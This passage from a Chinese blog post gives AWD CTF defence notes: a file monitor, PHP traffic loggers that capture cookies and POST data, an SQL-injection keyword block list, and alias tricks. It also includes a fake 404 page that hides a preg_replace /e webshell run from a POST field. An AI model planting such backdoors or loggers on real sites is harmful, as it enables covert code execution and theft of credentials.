            notifier<span class="token punctuation">.</span>loop<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
            notifier<span class="token punctuation">.</span>stop<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span> <span class="token punctuation">:</span>
    logDir <span class="token operator">=</span> setHttpserver<span class="token punctuation">(</span><span class="token punctuation">)</span>
    LogMonitor<span class="token punctuation">(</span>logDir<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="文件监控"><a href="#文件监控" class="headerlink" title="文件监控"></a>文件监控</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span>
<span class="token comment">#coding=utf-8</span>
<span class="token comment">#Usage ：python demo.py</span>
<span class="token comment">#Code by : AdminTony</span>
<span class="token comment">#QQ : 78941695</span>
<span class="token comment">#注意：要将此文件放在有读写权限的目录以及所有修改过的php必须在此目录或者该目录的子目录中。</span>
<span class="token comment">#作用：读取被修改过的文件，然后将文件的地址加上内容全部存放在txt</span>



<span class="token keyword">import</span> sys<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os
<span class="token comment">#查找最近10分钟被修改的文件</span>
<span class="token keyword">def</span> <span class="token function">scanfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token comment">#command: find -name '*.php' -mmin -10</span>
	command <span class="token operator">=</span> <span class="token string">"find -name \'*.php\' -mmin -10"</span>
	su <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span>command<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>stdin<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span>
	STDOUT<span class="token punctuation">,</span>STDERR <span class="token operator">=</span> su<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token builtin">list</span> <span class="token operator">=</span> STDOUT<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
	<span class="token comment">#print str(list)</span>
	<span class="token comment">#将文件处理成list类型然后返回。</span>
	<span class="token keyword">return</span> <span class="token builtin">list</span>

<span class="token comment">#读取文件：</span>
<span class="token keyword">def</span> <span class="token function">loadfile</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
	data <span class="token operator">=</span> <span class="token string">""</span>
	<span class="token comment">#如果文件不存在就跳出函数</span>
	<span class="token keyword">try</span> <span class="token punctuation">:</span>
		<span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>
		data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token keyword">except</span> <span class="token punctuation">:</span> 
		<span class="token keyword">return</span> <span class="token number">0</span>
	all_data <span class="token operator">=</span> addr<span class="token operator">+</span><span class="token string">"\n"</span><span class="token operator">+</span>data<span class="token operator">+</span><span class="token string">"\n\n"</span>
	file1 <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"shell.txt"</span><span class="token punctuation">,</span><span class="token string">'a+'</span><span class="token punctuation">)</span>
	<span class="token comment">#避免重复写入</span>
	<span class="token keyword">try</span><span class="token punctuation">:</span>
		shell_content <span class="token operator">=</span> file1<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token keyword">except</span><span class="token punctuation">:</span>
		shell_content <span class="token operator">=</span> <span class="token string">"null"</span>
	<span class="token comment">#如果文件内容不为空再写入，避免写入空的。</span>
	<span class="token comment">#print shell_content</span>
	<span class="token keyword">if</span> data <span class="token punctuation">:</span>
		<span class="token keyword">if</span> all_data <span class="token keyword">not</span> <span class="token keyword">in</span> shell_content<span class="token punctuation">:</span>
			file1<span class="token punctuation">.</span>write<span class="token punctuation">(</span>all_data<span class="token punctuation">)</span>
	<span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
	file1<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
	rm_cmd <span class="token operator">=</span> <span class="token string">"rm -rf "</span><span class="token operator">+</span>addr
	su <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span>rm_cmd<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>stdin<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span>
	su<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token keyword">print</span> <span class="token string">"loadfile over : "</span><span class="token operator">+</span>addr

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
	<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>

		<span class="token builtin">list</span> <span class="token operator">=</span> scanfile<span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token keyword">if</span> <span class="token builtin">list</span> <span class="token punctuation">:</span>
			<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
				<span class="token comment">#如果list[i]为空就不读取了</span>
				<span class="token keyword">if</span> <span class="token builtin">list</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>
					loadfile<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">else</span> <span class="token punctuation">:</span> <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/03/02/%E5%85%B3%E4%BA%8EAWD%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/image-20240412213613808.png" alt="image-20240412213613808"></p>
<p>此时shell.php被改成了shell.txt</p>
<p><img src="/blog/2024/03/02/%E5%85%B3%E4%BA%8EAWD%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/image-20240412213851702.png" alt="image-20240412213851702"></p>
<hr>
<h2 id="php流量监控"><a href="#php流量监控" class="headerlink" title="php流量监控"></a>php流量监控</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token comment">//记录访问者的ip</span>
<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token comment">//访问者要访问的文件名</span>
<span class="token variable">$parameter</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"QUERY_STRING"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token comment">//访问者要请求的参数</span>
<span class="token variable">$method</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token comment">//请求方法</span>
<span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>             <span class="token comment">//请求URI</span>
<span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y-m-d H:i:s'</span><span class="token punctuation">,</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//访问时间</span>
<span class="token variable">$post</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://input"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//接收POST数据</span>
<span class="token variable">$others</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'...其他你想得到的信息...'</span><span class="token punctuation">;</span>
<span class="token variable">$logadd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Visit Time：'</span><span class="token operator">.</span><span class="token variable">$time</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token operator">.</span><span class="token string single-quoted-string">'Visit IP：'</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token operator">.</span><span class="token string double-quoted-string">"\r\n"</span><span class="token operator">.</span><span class="token string single-quoted-string">'RequestURI：'</span><span class="token operator">.</span><span class="token variable">$uri</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token operator">.</span><span class="token variable">$parameter</span><span class="token operator">.</span><span class="token string single-quoted-string">'RequestMethod：'</span><span class="token operator">.</span><span class="token variable">$method</span><span class="token operator">.</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">;</span>
<span class="token comment">// log记录</span>
<span class="token variable">$fh</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/tmp/log.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"a+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token variable">$logadd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token variable">$post</span><span class="token operator">.</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token variable">$others</span><span class="token operator">.</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	
	<span class="token comment">// $path = "/var/www/html/log.txt";</span>
	<span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/html/log.txt"</span><span class="token punctuation">;</span>
	<span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"a+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"IP "</span><span class="token operator">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" url:"</span><span class="token operator">.</span><span class="token string single-quoted-string">'http://'</span><span class="token operator">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_HOST'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">;</span>
	<span class="token variable">$str</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"Gets:"</span><span class="token operator">.</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">" POST:"</span><span class="token operator">.</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">" COOKIE:"</span><span class="token operator">.</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"HEADER: "</span><span class="token operator">.</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">;</span>
	<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这种脚本一般放置在CMS的入口文件处，在这些入口的文件里使用<code>require_once()</code>就可以将监控脚本包含进去，达到流量监控的目的</p>
<p>一些常见的CMS入口地址：</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">PHPCMS V9 \phpcms\base.php
PHPWIND8.7 \data\sql_config.php
DEDECMS5.7 \data\common.inc.php
DiscuzX2   \config\config_global.php
Wordpress   \wp-config.php
Metinfo   \include\head.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>也可以每个文件都包含（慎用，可能会出现致命问题）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> /var/www/html <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> <span class="token string">"*.php"</span> <span class="token parameter variable">-exec</span> <span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">"s/&lt;?php/&lt;?php require_once('\/var\/www\/html\/phpMonitor.php');/g"</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> +<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/03/02/%E5%85%B3%E4%BA%8EAWD%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/image-20240413174111362.png" alt="image-20240413174111362"></p>
<hr>
<h2 id="Java流量监控"><a href="#Java流量监控" class="headerlink" title="Java流量监控"></a>Java流量监控</h2><p>参考：<a target="_blank" rel="noopener" href="https://github.com/hmt38/java_Laplace_Fluid_Maid">https://github.com/hmt38/java_Laplace_Fluid_Maid</a></p>
<p>摆烂jar：</p>
<p>直接部署，代替掉题目的服务</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> demo.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>摆烂class：</p>
<p>java源码编译为class，再将class打包进jar包</p>
<ol>
<li><p>首先修改package路径，比如说我计划在controller同级目录下新建Myfilter目录，将java文件放于这个路径中，所以package路径就是controller的package&#x2F;Myfilter</p>
</li>
<li><p>编译</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">javac <span class="token parameter variable">-extdirs</span> BOOT-INF/lib/ <span class="token parameter variable">-classpath</span> BOOT-INF/classes/<span class="token punctuation">..</span><span class="token punctuation">..</span>package<span class="token punctuation">..</span>./Myfilter MyObjectInputStream.java<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>更新 JAR 包中的指定文件</p>
<p>注意这里的打开目录要和javaweb目录一致，inputfile的目录要符合javawebpath</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">jar uf ctf-0.0.1-SNAPSHOT.jar BOOT-INF/classes/<span class="token punctuation">..</span><span class="token punctuation">..</span>package<span class="token punctuation">..</span>./Myfilter/MyObjectInputStream.class<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<hr>
<h2 id="前人的轮子"><a href="#前人的轮子" class="headerlink" title="前人的轮子"></a>前人的轮子</h2><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">流量监控日志
https://github.com/wupco/weblogger
https://github.com/DasSecurity-Labs/AoiAWD<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



<hr>
<h1 id="伪造"><a href="#伪造" class="headerlink" title="伪造"></a>伪造</h1><h2 id="404页面"><a href="#404页面" class="headerlink" title="404页面"></a>404页面</h2><p>伪造404（注意，PHP 5.5.0 版本中，<code>/e</code> 修饰符就已经被废弃，并且在 PHP 7.0.0 版本中被移除。7.0.0之后的版本<code>/e</code>修饰符就无法使用了）</p>
<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;IETF&#x2F;&#x2F;DTD HTML 2.0&#x2F;&#x2F;EN&quot;&gt;

  &lt;html&gt;&lt;head&gt;

  &lt;title&gt;404 Not Found&lt;&#x2F;title&gt;

  &lt;&#x2F;head&gt;&lt;body&gt;

  &lt;h1&gt;Not Found&lt;&#x2F;h1&gt;

  &lt;p&gt;The requested URL was not found on this server.&lt;&#x2F;p&gt;

  &lt;&#x2F;body&gt;&lt;&#x2F;html&gt;

  &lt;?php @preg_replace(&quot;&#x2F;[pageerror]&#x2F;e&quot;,$_POST[&#39;error&#39;],&quot;saft&quot;); header(&#39;HTTP&#x2F;1.1 404 Not Found&#39;);

?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>哦牛批还能这样搞的</p>
<p><img src="/blog/2024/03/02/%E5%85%B3%E4%BA%8EAWD%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/image-20240412215737732.png" alt="image-20240412215737732"></p>
<hr>
<h2 id="alias欺骗"><a href="#alias欺骗" class="headerlink" title="alias欺骗"></a>alias欺骗</h2><p>只对shell会话有效，对 webshell&#x2F;rce 无效</p>
<p>或许可以拿这个玩意写蜜罐（？</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">alias</span> <span class="token assign-left variable">cat</span><span class="token operator">=</span><span class="token string">"flag&#123;this_ls_fakall_flag&#125;"</span>
<span class="token builtin class-name">alias</span> <span class="token assign-left variable">cat</span><span class="token operator">=</span><span class="token string">"echo <span class="token variable"><span class="token variable">`</span><span class="token function">date</span><span class="token variable">`</span></span>|md5sum|cut -d ' ' -f1||"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>高权限的话可以直接改curl的执行权限</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token parameter variable">-x</span> <span class="token function">curl</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>删除别名</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">unalias</span> <span class="token function">curl</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/03/02/%E5%85%B3%E4%BA%8EAWD%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/image-20240413115148530.png" alt="image-20240413115148530"></p>
<hr>
<h1 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h1><p>仿照前面流量监控的方式批量上waf</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> /var/www/html <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> <span class="token string">"*.php"</span> <span class="token parameter variable">-exec</span> <span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">"s/&lt;?php/&lt;?php require_once('\/var\/www\/html\/RCEw4f.php');/g"</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> +<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/03/02/%E5%85%B3%E4%BA%8EAWD%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/image-20240413194129281.png" alt="image-20240413194129281"></p>
<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>PHP：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$filter</span> <span class="token operator">=</span>
<span class="token string double-quoted-string">"regexp|from|count|procedure|and|ascii|substr|substring|left|right|union|if|case|pow|exp|order|sleep|benchmark|into|outfile|dumpfile|load_file|select|update|set|concat|delete|alter|insert|create|union|or|drop|not|for|is|between|group_concat|like|where|ascii|greatest|mid|substr|left|right|char|hex|ord|case|limit|conv|table|mysql_history|flag|count|rpad|\&amp;|\*|\.|\#|-|\"|'|\|"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$filter</span><span class="token operator">.</span><span class="token string double-quoted-string">"/is"</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$filter</span><span class="token operator">.</span><span class="token string double-quoted-string">"/is"</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$param</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag&#123;You shall die!&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$param</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag&#123;You shall die!&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Java：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebFilter</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Enumeration</span></span><span class="token punctuation">;</span>
<span class="token annotation punctuation">@Component</span>
<span class="token annotation punctuation">@WebFilter</span><span class="token punctuation">(</span>urlPatterns <span class="token operator">=</span> <span class="token string">"/system/role/list"</span><span class="token punctuation">,</span> filterName <span class="token operator">=</span> <span class="token string">"sqlInjectFilter"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> sqlFilter <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> arg0<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> res<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span>
            chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">HttpServletRequest</span> request <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> req<span class="token punctuation">;</span>
        <span class="token class-name">HttpServletResponse</span> response <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">)</span> res<span class="token punctuation">;</span>
<span class="token comment">// 获得所有请求参数名</span>
